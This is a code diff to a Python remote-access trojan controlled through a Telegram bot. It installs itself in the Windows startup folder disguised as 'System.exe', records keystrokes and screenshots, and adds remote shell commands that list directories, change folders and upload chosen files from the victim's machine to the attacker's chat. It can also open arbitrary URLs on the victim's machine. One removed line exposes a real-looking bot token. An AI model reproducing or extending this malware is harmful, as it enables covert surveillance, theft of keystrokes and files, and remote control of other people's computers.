@@ -1,8 +1,9 @@
+import webbrowser
 import telebot
 import telegram
 import socket
 import pyautogui
-import os
+import os 
 import cv2
 import requests
 import time
@@ -11,10 +12,12 @@ import winshell
 import subprocess
 from pynput.keyboard import Listener
 from threading import Thread
+import webbrowser
+
 
 #Basic bot stuff
-TOKEN = '5487264317:AAEKOKCCVjlKYYC1aqlXJRcWGWLOl2ket08'
-CHAT_ID = '-833395968'
+TOKEN = ''
+CHAT_ID = ''
 bot = telebot.TeleBot(TOKEN)
 #Ip address
 ip = socket.gethostbyname(socket.gethostname())
@@ -39,13 +42,37 @@ def backdoor():
     try:
         #Adding file to startup
         startup = winshell.startup()
-        Startup_Path = r"" + startup +"\\app.py"
+        Startup_Path = r"" + startup +"\\System.exe"
         #PAth to file for startup
-        file = r"app.py"
+        file = r"app.exe"
         shutil.copyfile(file, Startup_Path)
         send_message("Backdoor: " + ip  + " " + "sent Successfully!")
     except:
         send_message("Cannot send backdoor!")
+
+#ls command
+def ls():
+    path = os.listdir()
+    result = '\n'.join([str(elem) for elem in path])
+    result = 'ls --→ result\n' + result
+    send_message(result)
+
+#cd ..
+def cdMinus():
+    os.chdir('..')        
+    currentpath = (os.getcwd())
+    currentpath = 'cd ..      --→ result\n' + currentpath
+    send_message(currentpath)
+
+#cd to directory
+def cdTo(command_ip):
+    try:
+        os.chdir(command_ip)
+        currentpath = (os.getcwd())
+        currentpath = 'cd --→ result\n' + currentpath
+        send_message(currentpath)
+    except:
+        send_message("Error! check command..")   
 
 #Keylogger
 def keylogger(timer):
@@ -79,7 +106,7 @@ def keylogger(timer):
     file.close()
     bot.send_document(chat_id=CHAT_ID, document=open(FILE_PATH, "rb"))
     os.remove(FILE_PATH)
-       
+
 #Screenshot code
 def take_screenshot():
     myScreenshot = pyautogui.screenshot()
@@ -188,17 +215,64 @@ def run(message):
 def run(message):
     command_ip = message.text
     command_ip = command_ip.split()
-    timer = command_ip[2] + ".0"
-    timer = float(timer)
-    print(type(timer))
+    try:
+        timer = command_ip[2] + ".0"
+        timer = float(timer)
+        print(type(timer))
 
-    if ip in command_ip:
-        send_message("Recording...")
-        keylogger(timer)
-    if "allbots" in command_ip:
-        send_message("Recording...")
-        keylogger(timer)
+        if ip in command_ip:
+            send_message("Recording...")
+            keylogger(timer)
+        if "allbots" in command_ip:
+            send_message("Recording...")
+            keylogger(timer)
+    except:
+        pass
+
+#Shell command + code
+@bot.message_handler(commands=['shell'])
+def run(message):
+    command_ip = message.text
+    command_ip = command_ip.split()
     
+    if ip in command_ip:
+        
+        if "ls" in command_ip:
+            ls()
+
+        elif "cd" in command_ip:
+            def cd_commands():
+                if ".." in command_ip:
+                    cdMinus()
+                else:
+                    try:
+                        dir = (command_ip[3])
+                        cdTo(dir)
+                    except:
+                        pass
+            cd_commands()
+
+        elif "get" in command_ip:
+            file = command_ip[-1]
+            dockfile = open(file, "rb")
+
+            try:
+                bot.send_document(chat_id=CHAT_ID, document=dockfile)
+                dockfile.close()
+            except:
+                send_message("Could not send file")
+
+@bot.message_handler(commands=['url'])
+def run(message):
+    command_ip = message.text
+    command_ip = command_ip.split()
+    if ip in command_ip:
+        url = command_ip[2]            
+        try:
+            webbrowser.open(url)
+        except:
+            pass
+
 def main():
     bot.polling()
 if __name__ == '__main__':
